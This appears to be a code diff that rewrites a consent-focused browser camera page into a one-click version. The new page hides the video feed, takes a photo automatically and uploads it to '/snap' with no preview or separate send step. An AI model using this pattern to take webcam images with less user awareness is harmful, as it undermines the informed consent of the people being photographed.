@@ -1,119 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Camera Capture (Consent)</title>
-  <style>
-    body { font-family: system-ui, -apple-system, Arial; padding: 16px; }
-    button { padding: 10px 14px; margin-right: 8px; }
-    video, img { width: 100%; max-width: 420px; border: 1px solid #ccc; border-radius: 8px; }
-    .row { margin: 12px 0; }
-    .note { color: #555; font-size: 14px; }
-  </style>
-</head>
-<body>
-  <h2>Camera Capture</h2>
-  <p class="note">
-    When you press “Enable Camera”, your browser will ask for permission.
-    After you capture, you can preview and then send.
-  </p>
+<button id="go">Enable & Send</button>
+<video id="v" autoplay playsinline style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
-  <div class="row">
-    <button id="enableBtn">Enable Camera</button>
-    <button id="captureBtn" disabled>Capture</button>
-    <button id="sendBtn" disabled>Send</button>
-  </div>
+<script>
+const go = document.getElementById('go');
+const v = document.getElementById('v');
+const c = document.getElementById('c');
 
-  <div class="row">
-    <video id="video" autoplay playsinline></video>
-  </div>
+go.onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    v.srcObject = stream;
 
-  <div class="row">
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="preview" alt="Preview will appear here" />
-  </div>
+    await new Promise(r => setTimeout(r, 500));
 
-  <div class="row note" id="status"></div>
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext('2d').drawImage(v, 0, 0);
 
-  <script>
-    const enableBtn = document.getElementById("enableBtn");
-    const captureBtn = document.getElementById("captureBtn");
-    const sendBtn = document.getElementById("sendBtn");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const preview = document.getElementById("preview");
-    const statusEl = document.getElementById("status");
+    const img = c.toDataURL('image/png');
 
-    let stream = null;
-    let imageBase64 = null;
+    stream.getTracks().forEach(t => t.stop());
 
-    function setStatus(msg) { statusEl.textContent = msg; }
-
-    enableBtn.onclick = async () => {
-      try {
-        setStatus("Requesting camera permission...");
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        captureBtn.disabled = false;
-        setStatus("Camera enabled. You can capture now.");
-      } catch (e) {
-        console.error(e);
-        setStatus("Camera permission denied or not available.");
-      }
-    };
-
-    captureBtn.onclick = async () => {
-      try {
-        if (!stream) return;
-
-        // Give camera a brief moment to settle
-        await new Promise(r => setTimeout(r, 300));
-
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        imageBase64 = canvas.toDataURL("image/png");
-        preview.src = imageBase64;
-
-        sendBtn.disabled = false;
-        setStatus("Captured. Preview shown. Press Send to upload.");
-      } catch (e) {
-        console.error(e);
-        setStatus("Failed to capture image.");
-      }
-    };
-
-    sendBtn.onclick = async () => {
-      try {
-        if (!imageBase64) return;
-
-        setStatus("Sending...");
-        const r = await fetch("/snap", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: imageBase64 })
-        });
-
-        if (r.ok) {
-          setStatus("Sent successfully.");
-        } else {
-          const t = await r.text().catch(() => "");
-          setStatus("Send failed: " + r.status + (t ? (" - " + t) : ""));
-        }
-      } catch (e) {
-        console.error(e);
-        setStatus("Network/server error.");
-      }
-    };
-
-    // Optional: stop camera when leaving page
-    window.addEventListener("beforeunload", () => {
-      if (stream) stream.getTracks().forEach(t => t.stop());
+    const r = await fetch('/snap', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ image: img })
     });
-  </script>
-</body>
-</html>
+
+    alert(r.ok ? 'Sent' : ('Failed: ' + r.status));
+  } catch (e) {
+    alert('Permission denied / camera not available');
+  }
+};
+</script>
